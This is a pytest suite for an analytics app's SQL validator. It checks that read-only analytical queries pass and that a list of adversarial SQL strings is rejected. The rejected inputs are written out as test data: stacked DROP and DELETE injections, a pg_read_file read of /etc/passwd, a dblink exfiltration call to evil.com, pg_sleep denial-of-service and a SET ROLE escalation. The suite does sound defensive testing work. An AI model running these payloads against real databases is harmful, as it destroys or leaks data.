"""Table-driven and adversarial SQL validator test suite (US-09, ADR-0005, SECURITY.md)."""

import pytest

from app.query.validator.pipeline import validate_sql
from app.query.validator.types import ValidationContext

CTX = ValidationContext(
    allowed_schema="ds_abcdef0123456789",
    allowed_tables=frozenset({"retail_sales", "customers"}),
)


@pytest.mark.parametrize(
    "valid_sql",
    [
        (
            "SELECT region, SUM(revenue) AS total_rev FROM retail_sales "
            "GROUP BY region ORDER BY total_rev DESC"
        ),
        "SELECT COUNT(*) FROM ds_abcdef0123456789.retail_sales WHERE returned = false",
        (
            "WITH top_regions AS ("
            "SELECT region, AVG(revenue) AS avg_rev FROM retail_sales GROUP BY region"
            ") SELECT * FROM top_regions"
        ),
        (
            "SELECT DATE_TRUNC('month', order_date) AS m, ROUND(SUM(revenue), 2) "
            "FROM retail_sales GROUP BY 1"
        ),
        (
            "SELECT r.region, c.name FROM retail_sales r "
            "JOIN customers c ON r.order_id = c.id LIMIT 20"
        ),
        "SELECT COALESCE(region, 'Unknown'), COUNT(DISTINCT product) FROM retail_sales GROUP BY 1",
    ],
)
def test_valid_analytical_queries_are_accepted(valid_sql: str) -> None:
    result = validate_sql(valid_sql, CTX)
    assert result.is_valid is True, f"Unexpectedly rejected: {result.violations}"
    assert result.normalized_sql is not None


@pytest.mark.parametrize(
    ("attack_name", "malicious_sql"),
    [
        ("empty", ""),
        ("stacked_drop", "SELECT 1 FROM retail_sales; DROP TABLE retail_sales;"),
        ("stacked_comment", "SELECT * FROM retail_sales -- safe\n; DELETE FROM retail_sales"),
        ("delete_direct", "DELETE FROM retail_sales"),
        ("update_direct", "UPDATE retail_sales SET revenue = 0"),
        ("insert_direct", "INSERT INTO retail_sales (order_id) VALUES (9999)"),
        ("drop_table", "DROP TABLE retail_sales"),
        ("truncate", "TRUNCATE TABLE retail_sales"),
        ("cte_wrapped_delete", "WITH d AS (DELETE FROM retail_sales RETURNING *) SELECT * FROM d"),
        (
            "cte_wrapped_update",
            "WITH u AS (UPDATE retail_sales SET revenue = 0 RETURNING *) SELECT * FROM u",
        ),
        ("select_into", "SELECT * INTO new_table FROM retail_sales"),
        ("locking_for_update", "SELECT * FROM retail_sales FOR UPDATE"),
        ("locking_for_share", "SELECT * FROM retail_sales FOR SHARE"),
        ("pg_catalog_access", "SELECT * FROM pg_catalog.pg_tables"),
        ("information_schema", "SELECT * FROM information_schema.tables"),
        ("app_schema_access", "SELECT * FROM app.sessions"),
        ("other_dataset_schema", "SELECT * FROM ds_9999999999999999.retail_sales"),
        ("unknown_table", "SELECT * FROM secret_table"),
        ("pg_stat_activity", "SELECT * FROM pg_stat_activity"),
        ("pg_sleep_dos", "SELECT pg_sleep(10) FROM retail_sales"),
        ("pg_read_file", "SELECT pg_read_file('/etc/passwd') FROM retail_sales"),
        ("dblink_exfil", "SELECT dblink('host=evil.com', 'SELECT 1') FROM retail_sales"),
        ("version_leak", "SELECT version() FROM retail_sales"),
        ("case_evasion", "sElEcT Pg_SlEeP(5) fRoM retail_sales"),
        ("copy_command", "COPY retail_sales TO '/tmp/out.csv'"),
        ("set_role", "SET ROLE app_owner"),
        ("cross_db_ref", "SELECT * FROM other_db.ds_abcdef0123456789.retail_sales"),
    ],
)
def test_adversarial_sql_is_100_percent_rejected(attack_name: str, malicious_sql: str) -> None:
    result = validate_sql(malicious_sql, CTX)
    assert result.is_valid is False, f"BYPASS DETECTED for {attack_name}: {malicious_sql}"
    assert len(result.violations) >= 1
